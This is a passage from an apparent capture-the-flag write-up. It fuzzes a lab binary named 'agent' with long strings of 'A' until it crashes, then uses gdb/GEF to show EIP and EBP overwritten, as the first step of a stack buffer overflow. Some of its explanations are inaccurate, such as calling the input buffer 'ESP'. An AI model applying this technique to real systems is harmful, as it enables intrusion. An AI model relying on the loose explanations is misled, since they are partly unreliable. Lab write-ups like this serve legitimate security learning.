AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Location: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Extraction team has been deployed.


```

let's try with the 3rd one 


```bash 
❯ ./agent
  ___ __  __ ___ 
 |_ _|  \/  | __|  Agent
  | || |\/| | _|   Reporting
 |___|_|  |_|_|    System


Agent ID : 48093572
Login Validated 
Main Menu:
1. Extraction Points
2. Request Extraction
3. Submit Report
0. Exit
Enter selection: 3

Enter report update: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Report: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Submitted for review.
zsh: segmentation fault  ./agent

```


seems that it has the vulnerability BOF because the according with the output ```zsh: segmentation fault  ./agent```

but how i know it ? 


let me explain you or let me introduce you to BOF

First of all, we need to understand a little bit about how programs work in order to comprehend how BOF occurs.

Using the same scenario as with the binary agent, we inserted so many A's that it caused a segmentation fault, right?

But this happened because we inserted A's where it allowed us to, like here."

```3. Submit Report
0. Exit
Enter selection: 3

Enter report update:
```

and this also where it allowed us to input, right? Well, this input that it allowed us to input is called ESP, which is the stack where it allows us to input our input. So, as we entered so many AAAAAAA's, the EBP and EIP were affected


```bash 
        ESP                          |       EBP           | EIP
+------------------------------------+---------------------+------+-----+
| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|AAAAAAAAAAAAAAAAAAAAA|AAAAAAAAAAAA| 
+------------------------------------+---------------------+------+-----+
```
But since the application interprets A as hexadecimal, instead of EBP and EIP being valued as A, they would be valued as \x41. The stack will still hold our input because it is a place where we can write our input. The fact that we can write into EIP corrupts the program because EIP is the instruction pointer, which is like the one that directs the flow of the program. Let's think of EIP as the pied piper of Hamelin who decides where to move the mice with his music. Similarly, EIP tells the program where to go, but since we added A's, EIP doesn't know where to go because A is not a valid address. 



Taking the previous example, and to emphasize what we said, it would be represented as follows:

```bash 
        ESP                          |       EBP           | EIP
+------------------------------------+---------------------+------+-----+
| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|\x41\x41\x41\x41\x41\|\x41\x41\x41| 
+------------------------------------+---------------------+------+-----+
```
- But perhaps the fact that we said that the A would be represented in hexadecimal as \x41, and you see in the example fewer representations of A, that is, you see fewer \x41s. Well, this is just an example. If you add 100 A's, there will be 100 representations of A's, or 100 \x41s.


So, as we mentioned before, the idea is that since we managed to input data into the EIP, we could manipulate the EIP. However, to do this, we need to measure how many characters we need to input to reach the EIP. To do this, we will use gdb gef, which is a low-level analysis tool. This means that it is a tool for analyzing machine code. We could also use peda or ghidra, but in my case, I will use gdb.

we execute gdb + the binary + q

```bash 
❯ gdb agent -q


GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 10.1.90.20210103-git in 0.01ms using Python engine 3.9
Reading symbols from agent...
(No debugging symbols found in agent)
```
now we have to run the program using r 

```bash 
gef➤  r
```

output | The program will appear to have run normally, but behind the scenes, GEF is analyzing everything that is executed.

```bash 
Starting program: /home/z3kk3n/Desktop/imf/agent 
[*] Failed to find objfile or not a valid file format: [Errno 2] No existe el fichero o el directorio: 'system-supplied DSO at 0xf7fd0000'
  ___ __  __ ___ 
 |_ _|  \/  | __|  Agent
  | || |\/| | _|   Reporting
 |___|_|  |_|_|    System


Agent ID : 

```

Let's use the same steps as before to corrupt the application and cause a segmentation fault


```bash 
```bash 
❯ ./agent
  ___ __  __ ___ 
 |_ _|  \/  | __|  Agent
  | || |\/| | _|   Reporting
 |___|_|  |_|_|    System


Agent ID : 48093572
Login Validated 
Main Menu:
1. Extraction Points
2. Request Extraction
3. Submit Report
0. Exit
Enter selection: 3

Enter report update: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
look the output

```bash 
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd344  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebx   : 0x0       
$ecx   : 0xffffffff
$edx   : 0xffffffff
$esp   : 0xffffd3f0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0xf7fa7000  →  0x001e4d6c
$edi   : 0xf7fa7000  →  0x001e4d6c
$eip   : 0x41414141 ("AAAA"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd3f0│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"	← $esp
0xffffd3f4│+0x0004: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd3f8│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd3fc│+0x000c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd400│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
